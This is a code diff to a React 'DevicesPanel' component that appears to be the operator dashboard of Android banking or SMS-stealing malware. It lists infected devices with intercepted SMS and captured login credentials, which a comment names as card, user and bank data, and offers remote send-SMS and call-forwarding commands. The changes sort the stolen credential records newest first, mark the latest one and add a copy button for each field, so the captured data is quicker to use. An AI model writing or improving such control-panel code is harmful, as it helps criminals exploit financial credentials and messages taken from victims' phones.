@@ -50,9 +50,10 @@ export default function DevicesPanel({
 
   const paginatedKeys = keys.slice(offset, offset + DEVICE_LIMIT);
 
-  const copyToClipboard = (text) => {
-    navigator.clipboard.writeText(text);
-    showToast(`📋 Copied: ${text}`, "success");
+  const copyToClipboard = (text, label = "Item") => {
+    if (!text) return;
+    navigator.clipboard.writeText(String(text));
+    showToast(`📋 Copied ${label}: ${String(text).slice(0, 25)}`, "success");
   };
 
   const toggleExpand = (id) => {
@@ -159,7 +160,11 @@ export default function DevicesPanel({
           const smsMap = data.user_sms?.[devId] || {};
           const smsList = Object.values(smsMap).reverse();
           const loginMap = data.login?.[devId] || {};
-          const loginList = Object.values(loginMap);
+          const loginList = Object.entries(loginMap).map(([key, val]) => ({
+            key,
+            ...val,
+            _timestamp: val.timestamp || val.date || 0
+          })).sort((a, b) => b._timestamp - a._timestamp);
 
           return (
             <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"} ${expanded ? "expanded" : ""}`}>
@@ -178,7 +183,7 @@ export default function DevicesPanel({
                     {isFav && <span className="fav-badge-premium">⭐ FAV</span>}
                     <button 
                       className="copy-device-id-btn" 
-                      onClick={(e) => { e.stopPropagation(); copyToClipboard(devId); }}
+                      onClick={(e) => { e.stopPropagation(); copyToClipboard(devId, "Device ID"); }}
                     >
                       <i className="fas fa-copy"></i> Copy ID
                     </button>
@@ -252,23 +257,59 @@ export default function DevicesPanel({
                     </div>
                   )}
 
-                  {/* Login Section */}
+                  {/* Login Section (Individual Copy Buttons for Card, User, Bank, etc.) */}
                   {curTab === "login" && (
                     <div className="section-premium active">
-                      <div className="section-title">🔑 Credentials ({loginList.length})</div>
+                      <div className="section-title">
+                        🔑 Credentials ({loginList.length})
+                        <button 
+                          onClick={() => deleteDeviceData(devId, "credentials")}
+                          className="btn-luxury btn-red" 
+                          style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}
+                        >
+                          🗑️ Delete All
+                        </button>
+                      </div>
                       <div className="creds-container-premium">
-                        {loginList.map((cred, i) => (
-                          <div key={i} className="cred-item-premium">
-                            <div className="cred-fields-premium">
-                              {Object.entries(cred).filter(([k]) => !k.startsWith("_") && k !== "timestamp").map(([k, v]) => (
-                                <div key={k} className="cred-field-premium">
-                                  <span className="field-label-premium">{k}</span>
-                                  <span className="field-value-premium">{String(v)}</span>
+                        {loginList.length === 0 ? (
+                          <div className="empty-luxury">No credentials saved for this device.</div>
+                        ) : (
+                          loginList.map((cred, i) => {
+                            const timeStr = cred._timestamp ? new Date(cred._timestamp).toLocaleString() : "";
+                            return (
+                              <div key={cred.key || i} className="cred-item-premium" style={{ borderLeft: i === 0 ? "2px solid var(--green)" : "1px solid var(--border-color)" }}>
+                                <div className="cred-header-premium">
+                                  <span style={{ fontWeight: 600, color: "var(--gold)" }}>
+                                    📋 Record #{i + 1} {i === 0 && <span style={{ background: "var(--green)", color: "#fff", fontSize: 8, padding: "1px 6px", borderRadius: 8, marginLeft: 4 }}>LATEST</span>}
+                                  </span>
+                                  <span>{timeStr}</span>
                                 </div>
-                              ))}
-                            </div>
-                          </div>
-                        ))}
+                                <div className="cred-fields-premium" style={{ gridTemplateColumns: "1fr" }}>
+                                  {Object.entries(cred)
+                                    .filter(([k]) => !k.startsWith("_") && k !== "timestamp" && k !== "key")
+                                    .map(([k, v]) => (
+                                      <div key={k} className="cred-field-premium" style={{ padding: "4px 0", borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
+                                        <span className="field-label-premium" style={{ fontWeight: 600, color: "var(--text-secondary)" }}>{k}</span>
+                                        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+                                          <span className="field-value-premium" style={{ color: "var(--text-primary)", fontWeight: 500 }}>{String(v)}</span>
+                                          <button 
+                                            className="copy-btn-premium"
+                                            title={`Copy ${k}`}
+                                            onClick={(e) => {
+                                              e.stopPropagation();
+                                              copyToClipboard(v, k);
+                                            }}
+                                          >
+                                            <i className="fas fa-copy"></i>
+                                          </button>
+                                        </div>
+                                      </div>
+                                    ))}
+                                </div>
+                              </div>
+                            );
+                          })
+                        )}
                       </div>
                     </div>
                   )}
@@ -300,7 +341,7 @@ export default function DevicesPanel({
                     </div>
                   )}
 
-                  {/* Commands: Send SMS (with SIM 1 & SIM 2 Selector) */}
+                  {/* Commands: Send SMS */}
                   {curTab === "sendsms" && (
                     <div className="section-premium active">
                       <div className="section-title">✉️ Send SMS</div>
@@ -335,7 +376,7 @@ export default function DevicesPanel({
                     </div>
                   )}
 
-                  {/* Commands: Call Forward (with SIM 1 & SIM 2 Selector) */}
+                  {/* Commands: Call Forward */}
                   {curTab === "fwd" && (
                     <div className="section-premium active">
                       <div className="section-title">🔀 Call Forward</div>
